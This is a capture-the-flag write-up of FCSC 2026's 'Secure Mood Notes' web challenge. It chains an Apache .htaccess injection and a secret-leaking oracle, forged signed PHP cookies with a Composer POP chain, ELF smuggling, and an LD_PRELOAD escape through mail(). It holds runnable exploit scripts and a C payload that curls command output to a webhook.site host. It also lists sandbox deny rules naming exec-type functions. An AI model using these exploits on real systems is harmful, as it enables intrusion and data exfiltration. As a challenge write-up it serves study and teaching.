+++
type               = "ctf"
title              = "Secure Mood Notes"
description        = "Leaking a Snuffleupagus secret key via Apache .htaccess injection, then forging signed PHP cookies to chain a Composer gadget, smuggling an ELF into the server and escaping the sandbox via LD_PRELOAD and mail()"
author             = "conflict"
date               = "2026-04-11"
language           = "en"
tags               = ["web", "web-server", "php", "apache", "flask", "ld_preload", "pop_chain", "snuffleupagus", "rce"]
event              = "FCSC 2026"
category           = "web"
stars              = 3
solves             = 12
challenge_author   = ["Worty"]
challenge_author_url = ["https://worty.fr"]
rating             = 9.5
flag               = "FCSC{5c3fa80edf2ea136b4ea966297e56c2639d9d7825371d01858436bcb22ff0426}"
redirect_from      = ["/posts/2026/04/fcsc-2026-secure-mood-notes/"]
pinned             = true
+++

# Introduction

Secure Mood Notes is a two-part web challenge from FCSC 2026. Both parts share the same infrastructure: a note-taking application where notes have "moods" (angry, chill, normal) that transforms their content. The first flag is hidden inside the Snuffleupagus configuration, and the second one requires full remote code execution on the server.

The challenge runs in a single Docker container with two applications behind Apache:

- A PHP/Symfony app served on `/`, handling note creation, storage and rendering
- A Flask app on `/share/`, proxied from port 5000, handling note sharing

Notes are stored entirely client-side in a signed cookie. Snuffleupagus is loaded as a PHP extension and enforces runtime restrictions. A `tmpfs` is mounted at `/var/www/html/public/shared_notes` with the *exec* flag, foreshadowing part 2.

# TLDR

Part 1 abuses an IPv6 zone ID to inject arbitrary Apache directives into a `.htaccess`, then uses Apache's expression language to build a character-by-character oracle that leaks the Snuffleupagus secret key from `/opt/default.rules`. Part 2 uses that key to forge signed PHP cookies, chains a `Composer\Autoload\ClassLoader` gadget to get arbitrary file inclusion, smuggles a compiled `.so` into the server disguised as a note, and finally escapes Snuffleupagus entirely by loading it via `LD_PRELOAD` through `mail()`.

# Infrastructure Analysis

## The Symfony Application

Notes are stored in the `notes_data` cookie as a base64-encoded serialized PHP *Notes* object. When creating or updating a note, the client sends data XOR-encrypted with a 16-byte key from the `client_key` cookie:

```php
// Utils.php
private static function decryptParam(string $data, string $key): string
{
    $out = '';
    $key_size = strlen($key);
    $data_size = strlen($data);

    for ($i = 0; $i < $data_size; $i++) {
        $out .= $data[$i] ^ $key[$i % $key_size];
    }

    return $out;
}
```

The *Notes* class supports three filter modes applied via `array_map()`:

```php
// Notes.php
public function filter(string $filter) {
    return array_map($this->filters[$filter], $this->all_notes);
}
```

The filters are initialized in the constructor as `[$this, "angryMode"], [$this, "chillMode"], [$this, "normalMode"]`, but since it's a public property, a deserialized object can have anything there.

## The Flask Application

The Flask app exposes a single `/create` endpoint. It validates inputs, fetches the note contents from the PHP app internally, and writes two files to a new UUID folder:

```python
with open(f"{share_folder}/shared.mood.notes","w",encoding="latin-1") as fd_mood_note:
    fd_mood_note.write(f"{resp['title']}\n{resp['content']}")
with open(f"{share_folder}/.htaccess","w") as fd_htaccess:
    fd_htaccess.write(HT_ACCESS_CONTENT%(note_filename, allowed_ip))
```

With the `HT_ACCESS_CONTENT` variable being declared to:

```python
HT_ACCESS_CONTENT="""<FilesMatch "\\.mood\\.notes$">
Header set Mood-Filename %s
Require ip %s
Options -ExecCGI
php_flag engine off
</FilesMatch>"""
```

The `name` is filtered (no `/`, `.`, `{`, `}`, newlines, etc.) and capped at 10 characters, and the `allowed_ip` is validated with Python's `ip_address()` 

```python
def clean_filename(name: str) -> str:
    name = re.sub(r'[./;!\n\r"<>\(\)\{\}\[\]]', '', name)
    name = re.sub(r'\s+', ' ', name)
    return name.strip()
    
 [...]

if len(data.get("name")) > 10:
    return jsonify({"errror":"Filename too long"}), 422
if not note_id.isdigit():
    return jsonify({"error": "Invalid note_id"}), 422

try:
    ip_address(allowed_ip)
except:
    return jsonify({"error":"Invalid IP address"}), 422
```

## Snuffleupagus, the Bouncer

![snuffleupagus_meme](https://i.imgflip.com/aoxy3d.jpg)

Snuffleupagus is a PHP extension that hooks into the Zend VM and enforces rules at runtime. The  rules from `default.rules`:

```php
sp.global.secret_key("FCSC{FAKE_FLAG1}");
sp.xxe_protection.enable();
sp.unserialize_hmac.enable();
sp.disable_function.function("assert").drop();
sp.disable_function.function("create_function").drop();
sp.disable_function.function("mail").param("additional_params").value_r("\\-").drop();
sp.disable_function.function("system").drop();
sp.disable_function.function("shell_exec").drop();
sp.disable_function.function("exec").drop();
sp.disable_function.function("proc_open").drop();
sp.disable_function.function("passthru").drop();
sp.disable_function.function("popen").drop();
sp.disable_function.function("pcntl_exec").drop();
sp.disable_function.function("file_put_contents").drop();
sp.disable_function.function("rename").drop();
sp.disable_function.function("copy").drop();
sp.disable_function.function("move_uploaded_file").drop();
sp.disable_function.function("ZipArchive::__construct").drop();
sp.disable_function.function("DateInterval::__construct").drop();
```

The first flag is that secret key.  `sp.unserialize_hmac` means every unserialized object must have a valid *HMAC-SHA256* tag appended to it.

The rules block most of the useful functions for *RCE*, making it hard even if we can get a PHP execution.

## Useful Observations

- `/tmp` has permissions `700`, so no temp file writes for `www-data`
- `AllowOverride All` is set for the webroot so `.htaccess` files are fully parsed
- `/dev/shm` is read-only, which makes the only writable location for `www-data` `/run/apache2/socks`

# Part 1 - Reading the Snuffleupagus Secret

## Slipping Through the .htaccess

### Bypassing ip_address() with an IPv6 zone ID

Python's `ip_address()` accepts IPv6 addresses with a zone ID suffix, the zone ID starts at `%` and runs to the end of the string. This means the following passes validation:

```php
fe80::1%\nRequire all granted\nHeader set Injected yes 
```

The newlines are also written in the `.htaccess`, injecting arbitrary Apache directives between the `Header set Mood-Filename` line and the original `Require Ip` line.

### Neutralizing the "Require Ip" Header

Apache treats `\` at the end of a line as a line continuation, the next line is merged into the current directive. Setting `name` to `'\` produces:

```xml
<FilesMatch "\\.mood\\.notes$">
Header set Mood-Filename '\
Require ip 127.0.0.1
Options -ExecCGI
php_flag engine off
</FilesMatch>
```

The `'` opens a quoted string and `\` continues the line, so Apache merges `Header set Mood-Filename` with `Require ip 127.0.0.1`, swallowing the access restriction and making the note publicly accessible.

## Getting Apache to Leak the Secret Key

### expr in boolean context inside Header set

Apache's `mod_headers` supports `expr=` in `Header set`. The full directive syntax is:

```xml
Header set <name> <value_if_true> "expr=<boolean_expression>"
```

When the expression evaluates to *true*, the header is set to the first value argument. When *false*, the header is omitted. In this boolean context, functions like `file()` and `req()` use standard `funcname(arg)` call syntax instead of the `%{funcname:arg}` syntax. Note that we wouldn't be able to use this syntax as we are passing this through the `ip_address()` function and some characters like `%` break the parsing and raise an error.

### Reading /opt/default.rules with file(req('Path'))

We inject the following directive via the `allowed_ip` field:

```php
fe80::1%\nRequire all granted\nHeader set Matched yes "expr=file(req('Path')) =~ m#FCSC\{#"
```

Which produces a `.htaccess` containing:

```php
<FilesMatch "\\.mood\\.notes$">
Header set Mood-Filename '\
Require ip fe80::1%'
Require all granted
Header set Matched yes "expr=file(req('Path')) =~ m#FCSC\{#"
Options -ExecCGI
php_flag engine off
</FilesMatch>
```

Then fetching the note with a custom `Path` header:

```bash
curl -i -H 'Path: /opt/default.rules' http://localhost:8000/shared_notes/ef7bb5b7-d966-46fb-ae21-f42909d0dbd2/shared.mood.notes
```

If the regex matches, the response contains a `Matched: yes` header.

The flag content is hex, so the charset is just `0123456789abcdef`. For each position we test every candidate:

```
m#FCSC\{9# -> Matched: yes -> confirmed '9'
m#FCSC\{9c# -> Matched: yes -> confirmed 'c'
m#FCSC\{9c3# -> Matched: yes -> confirmed '3'
```

## Extraction Script and Result

For each character, a new share is created (since the payload is inserted into `.htaccess` at creation time), then the note is fetched with the `Path` header.

```python
import requests

URL = "https://secure-mood-notes.fcsc.fr/"
CHARSET = "0123456789abcdef"
CLIENT_KEY = f"mfC0le1GPWwAM%2BcSTzLT%2FA%3D%3D"
NOTES_DATA = "..."

def check_char(cand):
    allowed_ip = (
        "fe80::1%\n"
        "Require all granted\n"
        f'Header set Matched yes "expr=file(req(\'Path\')) =~ m#FCSC\\{{{cand}#"'
      )
    payload = {
        "note_id": "0",
        "allowed_ip": allowed_ip,
        "name": "'\\",
      }

    r = requests.post(URL + "share/create", json=payload, headers={"Cookie": "client_key=" + CLIENT_KEY + "; notes_data=" + NOTES_DATA})
    share_path = r.json()["path"]

    rr = requests.get(URL + share_path, headers={"Path":"/opt/default.rules"})
    return rr.headers.get("Matched") == "yes"

def main():
    flag = ""
    for i in range(64):
        found = False
        for c in CHARSET:
            candidate = flag + c
            print("Trying candidate: " + candidate)
            if check_char(candidate):
                flag = candidate
                print(f"Found character: {c}, current flag: {flag}")
                found = True
                break
        if not found:
            print("No more characters found, stopping.")
            break
    print("Final flag: FCSC{" + flag + "}")

if __name__ == "__main__":
    main()
```

Flag Part 1: `FCSC{9c3c34c030a9d6d8}`

# Part 2 - Escaping the Cage

## Forging Signed Serialized Cookies

### Snuffleupagus HMAC Format

Snuffleupagus appends the *HMAC-SHA256* hex digest (64 bytes) directly at the end of the serialized payload without any separator. To produce a valid cookie:

```python
import hmac
import hashlib
import base64
import urllib.parse

SECRET_KEY = b"FCSC{FAKE_FLAG1}"
SERIALIZED = rb'...'

tag = hmac.new(SECRET_KEY, SERIALIZED, hashlib.sha256).hexdigest().encode()
cookie = base64.b64encode(SERIALIZED + tag).decode()

# url encode cookie because that's how it's stored
print("Cookie: \n" + urllib.parse.quote(cookie, safe=''))
```

### Forging arbitrary Notes objects

With the key recovered, any serialized payload is now accepted by the PHP app. A simple sanity check: calling `phpinfo()` via `array_map()`:

```php
O:15:"App\Model\Notes":2:{
    s:9:"all_notes";a:1:{i:0;i:1;}
    s:7:"filters";a:1:{s:3:"cnf";s:7:"phpinfo";}
}
```

Accessing `/api/notes?filter=cnf`, the backend would call `array_map($this->filters["cnf"], $this->all_notes)` where the first argument is `phpinfo` and the second argument is `1`, resulting in a call to `phpinfo(1)` that can be observed on the page.

## POP Chain to Arbitrary File Inclusion

### Finding Gadgets

We have `Notes::filter()` to call `array_map($this->filters[$filter], $this->all_notes)` but this doesn't allow us to do anything we want, we need more freedom on the executed PHP.

Composer's `ClassLoader` contains a scope-isolated include closure:

```php
private static function initializeIncludeClosure()
{
    if (self::$includeFile !== null) {
        return;
    }

    /**
     * Scope isolated include.
     *
     * Prevents access to $this/self from included files.
     *
     * @param  string $file
     * @return void
     */
    self::$includeFile = \Closure::bind(static function($file) {
        include $file;
    }, null, null);
}
}
```

```php
public function loadClass($class)
{
    if ($file = $this->findFile($class)) {
        $includeFile = self::$includeFile;
        $includeFile($file);
    }
}
```

`findFile()` resolves the class name against the `classMap` array first, before any filesystem lookup. By crafting a `ClassLoader` with `classMap["CNF"] = "/path/to/shared.mood.notes"`, calling `loadClass("CNF")` includes that file directly.

### Building the Serialized Payload

The `classLoader` has private properties which require null-byte prefixes in the serialized format. The payload must be built in PHP in order to handle them correctly.

```php
<?php
require __DIR__ . '/../secure-mood-notes/src/main_notes_app/vendor/autoload.php';

use App\Model\Notes;
use Composer\Autoload\ClassLoader;

//$secret = 'FCSC{FAKE_FLAG1}';
$secret = 'FCSC{9c3c34c030a9d6d8}';
$path = '/path/to/shared.mood.notes';

$loader = new ClassLoader();
$loader->addClassMap([
    'CNF' => $path,
]);

$notes = new Notes([]);
$notes->all_notes = ['CNF'];
$notes->filters = [
    'incl' => [$loader, 'loadClass'],
];

$ser = serialize($notes);
$signed = $ser . hash_hmac('sha256', $ser, $secret);
echo urlencode(base64_encode($signed)), PHP_EOL;
```

This script returns the `notes_data` cookie, ready to be sent to the PHP app.

A request to `/api/notes?filter=incl` now executes `include "/path/to/shared.mood.notes"`, we have arbitrary PHP execution from a file we control because it's any shared note.

![include_meme](https://i.imgflip.com/aoxyqb.jpg)

## Smuggling an ELF into the Server

### Writing raw bytes via the forged cookie

The Flask app writes `{title}\n{content}` to the note file in `latin-1` and the content comes from the `notes_data` cookie. By embedding raw *ELF* bytes in a `Note` object inside a forged cookie, arbitrary binary content lands on disk under `shared_notes/`. Note that if the encoding was not `latin-1` this would not be possible as non-ascii characters would get prefixed with `\xc2`.

To prevent Flask from breaking our *ELF* by adding a `\n` in the middle of it, we need to split it at the first `0x0a` byte:

```python
payload = (out / "hook.so").read_bytes()

split = payload.find(b"\n")
if split == -1:
    print("payload does not contain a newline byte", file=sys.stderr)
    sys.exit(1)

title = payload[:split].decode("latin-1").encode("utf-8")
content = payload[split + 1:].decode("latin-1").encode("utf-8")

title_file = out / "note_title.utf8.bin"
content_file = out / "note_content.utf8.bin"

title_file.write_bytes(title)
content_file.write_bytes(content)
```

### Cookie size issues and .so minimization

This is a problem I encountered when trying my solve on the remote instance after I had it working on my local docker. The remote instance had a *HAProxy* in front denying any incoming request bigger than 16ko, with a whole *ELF* in my cookies, my requests were not accepted by the proxy, so I had to find a way to make my `hook.so` smaller.

Not knowing the existence of `upx`, I added every compilation flag I could find to make the `.so` smaller without breaking it:

```python
subprocess.run([
        gcc,
        "-shared",
        "-fPIC",
        "-Os",
        "-s",
        "-fno-asynchronous-unwind-tables",
        "-fno-exceptions",
        "-fvisibility=hidden",
        "-Wl,--gc-sections",
        "-Wl,--build-id=none",
        "-Wl,--hash-style=gnu",
        "-Wl,-z,norelro",
        str(out / "hook.c"),
        "-o",
        str(out / "hook.so"),
    ], check=True)

    # objcopy to remove sections that contain useless information
    subprocess.run([
        objcopy,
        "--remove-section=.note.gnu.property",
        "--remove-section=.comment",
        str(out / "hook.so"),
        str(out / "hook.so"),
    ], check=True)

    if strip_bin:
        subprocess.run([strip_bin, "--strip-section-headers", str(out / "hook.so")], check=True)
```

![gcc_meme](https://i.imgflip.com/aoxzf4.gif)

## The Snuffleupagus incident

The last step is to find a way to get our shared object loaded, so that our malicious payload is executed.

Snuffleupagus blocks direct execution functions but leaves `putenv()` and `symlink()` untouched. We can write to `/run/apache2/socks` but not to `shared_notes/` and the name of our *ELF* on the machine is `shared.mood.notes`. To fix this issue we make a `hook.so` symlink in `/run/apache2/socks` that points to our *ELF*.

`mail()` is also not dropped, only its `additional_params` argument. Internally, `mail()` calls `execve("/usr/bin/sendmail", ...)`. Even though `sendmail` is not available on the machine, the child process inherits the `LD_PRELOAD` set by `putenv()`, loads our `.so` and runs the constructor before anything else, entirely outside the Snuffleupagus context.

```php
<?php
symlink('/path/to/shared.mood.notes', '/run/apache2/socks/hook.so');
putenv('LD_PRELOAD=/run/apache2/socks/hook.so');
mail('x', 'x', 'x');
echo "DONE HOOK";
?>
```

The `.so`'s constructor:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");
    system("/getflag please give me the flag | curl -sG --data-urlencode \"flag@-\" https://webhook.site/...");
    _exit(0);
}
```

We have now escaped Snuffleupagus's restrictions, gained Command Execution on the remote machine and extracted the flag !

# Conclusion

This was by far one of my favourite challenges of this 2026 edition, and also the first time I've solved a 3 star challenge in the FCSC. Thanks to Worty for this amazing challenge !

# Additional Scripts

See the downloadable solve scripts for the full pipeline: `leak.py` (Part 1 oracle), `make_classloader.php` (forge the classloader cookie), `craft_cookie.php` (embed the ELF into the cookie), and `build_hook.py` (compile the minimal shared object).
